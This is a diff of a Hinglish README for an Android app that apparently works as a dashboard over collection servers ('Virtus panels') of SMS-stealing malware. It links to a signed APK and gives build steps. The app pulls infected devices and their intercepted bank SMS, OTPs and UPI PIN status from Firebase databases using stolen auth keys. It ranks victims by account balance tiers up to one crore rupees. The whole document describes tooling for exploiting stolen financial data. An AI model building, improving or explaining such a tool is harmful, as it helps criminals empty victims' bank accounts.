@@ -1,15 +1,15 @@
 # Firebase SMS Panel (standalone APK)
 
-Alag Android app — repo ke bots / Virtus APK se **alag**. TXT me Firebase RTDB URLs → HTTPS parallel fetch → device list. Har SMS par **sender ID** clearly.
+Virtus Panel Viewer Pro–style screen: **TXT** me Firebase panels → **Start Fetch** / **Fetch Live** → devices + bank SMS (jo **tier + PIN + connection** select ho).
 
 ## Signed APK
 
-**Download (latest signed, v1.0.11):**  
-`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0.11-release-signed.apk`
+**Download (latest signed, v1.0.12):**  
+`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0.12-release-signed.apk`
 
-**Signed** — phone pe “Install unknown apps” allow karo. Older: `FirebaseSmsPanel-1.0-release-signed.apk` (purana build).
+**Signed** — phone pe “Install unknown apps” allow karo.
 
-### Build locally (2 min)
+### Build locally
 
 Keystore **GitHub pe upload mat karo** — apne PC par banao:
 
@@ -23,50 +23,33 @@ cp keystore.properties.example keystore.properties
 ./gradlew assembleRelease
 ```
 
-**Output:** `app/build/outputs/apk/release/app-release.apk` — ye **signed** hai (v2/v3).
+**Output:** `app/build/outputs/apk/release/app-release.apk`
 
-Unsigned (agar `keystore.properties` na ho): same path pe build **unsigned** banta hai — Gradle signing optional hai.
+## Use (screenshot jaisa)
 
-Optional (unsigned, agar repo me rakha ho):  
-`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0-release-unsigned.apk`
-## Build
-
-1. Android Studio (latest) → **Open** → `firebase-sms-panel-app`
-2. Gradle sync → Run / Build APK  
-   (Pehli sync pe Gradle wrapper scripts ban sakte hain.)
-
-## Use
-
-1. **TXT** → **Virtus format** (same as Virtus Panel Viewer Pro `assets/index.html`): har panel ke liye **Firebase URL** line + **Auth Key** line (`KEY:`, `Secret:`, `token:` …). Plain URL-only lines bhi chalengi agar DB **public read** ho. Load ke turant baad **auto-fetch nahi** — pehle filters set karo.
-2. **Fetch Live** → 45s auto-refresh ON + immediate fetch (same filters).
-3. **Start Fetch** → pehla pull ya dubara pull (URLs load hone ke baad, filters ke saath).
-4. **Export TXT** → filtered device list share (Telegram/Drive).
-5. **Search Here** + right pe **connection chip** (tap = Online → Offline → Both cycle). **Default = Both** taaki panel “offline” dikhne par bhi SMS list na khali ho. Agar kuch na dikhe lekin progress me **SMS count** ho — filter tight hai → **Full inbox** ya **All** SMS age try karo; orange hint line bhi dikhegi.
-6. **Dark dashboard** (Virtus screenshot jaisa): top row **TXT + Export TXT** (panel count), second row full-width **Fetch Live** (text squeeze nahi hota); metrics cards, pills: **High 1L-20L, Boom 20L-1Cr, Medium 5K, Low→High**, PIN, sort ₹/Battery, SMS age. **App icon** = tumhara **Virtus GT SMS MODULE** logo.
-7. **Live SMS** — **yellow** strip, white cards (**MSG** green). **Devices** — **white rounded cards** (Virtus native list jaisa): blue index + phone, Mobile / UPI / Device Id / Battery / Bank SMS / Date, **Status**; neeche **MSG (filters ke hisaab se)** — jo **Bank+Band / OTP / inbox / PIN / age** select hai, wahi SMS **card par** dikhte hain (tap pe sheet me poori list). Right circles **like / info / delete**; **card tap** → bottom sheet. Detail sheet (**yellow**).
-8. **Bank+Band tiers** — presets: **High 1L–20L**, **Boom 20L–90L** (label “1Cr style”), **Medium 5K–1L**, **Low→High 2K–50K**. **All bank** = purana 50K–90L / 2K–50K High/Low sort (no tier preset).
-9. **Sort list by** (bank modes): **₹** ya **Battery %** (devices jo filters se pass ho).
-10. **Virtus-style dashboard** — cards: DEVICES, ONLINE, BALANCE, BANK SMS, PANELS; **Live SMS** = filtered recent messages.
-11. **Inbox mode (pills)** — Bank+Band / All bank / OTP / Full (same behavior as before).
-12. **PIN filter** — Bank modes: With / Without / Both (device-level UPI/PIN detection).
-13. **SMS age** — `1d` … `30d` ya **All** (timestamp missing = still shown).
-14. **Live refresh** — **Fetch Live** = 45s job ON.
-15. **Device Details** — card tap ya **Info (i)**; **yellow** background, white card: **Balance (fetch)**, battery, SIM, forwarder, UPI PIN, SMS list (green MSG). Fetch ke baad line: **… panels · N SMS** (kitna data aaya). **v1.0.9** — `messages/<deviceId>/...` path fix. **v1.0.10** — white cards; stronger online/offline. **v1.0.11** — har device card par **filtered SMS preview** (Virtus jaisa bina alag screen ke).
+1. **TXT** — Virtus format: har panel **Firebase URL** + **KEY:** / **Secret:** / `token:` (same as Virtus `index.html`). Bina key ke sirf **public read** DB.
+2. **Fetch Live** — turant dubara fetch (**45s auto-refresh nahi**).
+3. **Start Fetch** — same; har baar **jo filter select** hai us hisaab se list + SMS.
+4. **Export TXT** — filtered device list share.
+5. **Metrics** — DEVICES, ONLINE, BALANCE, BANK SMS, **PHONE** = loaded panel count (TXT).
+6. **Search Here** + **Online / Offline** chip (sirf do — Virtus ref jaisa).
+7. **Balance band** — High 1L-20L, Boom 20L-1Cr, Medium 5K, Low→High (bank SMS + amount tier).
+8. **PIN** — PIN / No PIN; dubara tap = **sab devices** (donon).
+9. **SMS age** — **1d** ya **All** (baaki din options hata diye).
+10. **ACTIVE** strip — tier + PIN + connection + age.
+11. **Devices** — white cards; neeche **MSG** jo **filters** se pass hue; **card tap** → poori list sheet me.
 
 ### Virtus fetch (auth + `clients` + `messages`)
 
-- **Secret key:** Har request `...json?auth=<Auth Key>` (Drive APK jaisa).
-- Pehle **`clients.json`** — device ids + model/battery/status.
-- Phir har device: **`messages/<deviceId>.json`** — pehle `orderBy="$key"&limitToLast=3500`, khali ho to poora node.
-
-Bina key ke sirf **public** DB ka data aayega; warna TXT me **KEY:** line add karo.
+- Har request: `...json?auth=<Auth Key>`
+- `clients.json` → device meta
+- `messages/<deviceId>.json` → SMS (`orderBy` + `limitToLast` fast path)
 
 ## Data
 
-- Har fetch me zyada SMS lane ke liye deep JSON walk + timeout badhaya; cap ~**8000** SMS/DB (OOM se bachne ke liye). Same JSON walk se `devices/...` nodes se **model, battery, SIM, lastSeen** jaisi fields pick hoti hain jahan Firebase tree me milti hain.
-- **Live** = app ko dubara sync karna; SMS tab dikhenge jab phone/WMS Firebase ko update kare.
+- Cap ~**8000** SMS/DB. Path fix: `messages/<deviceId>/...` (device id sahi segment).
 
 ## Notes
 
-- **Auth Key** ke saath **rules read** ho; bina key **public** read wale projects hi chalenge.
-- OTP mode spam short-links hata hai; baaki telco sender IDs match karne ki koshish.
+- Agar fetch ke baad **SMS count 0** — KEY / rules check; error line app me dikhegi agar panel ne message bheja ho (`clients empty`, `403`, …).
+- Agar **SMS aaye lekin devices 0** — tier tight hai → **Medium** ya **Low→High** try karo, **PIN** reset, **1d** hata ke **All**, ya **Offline** chip (data + “offline” devices).
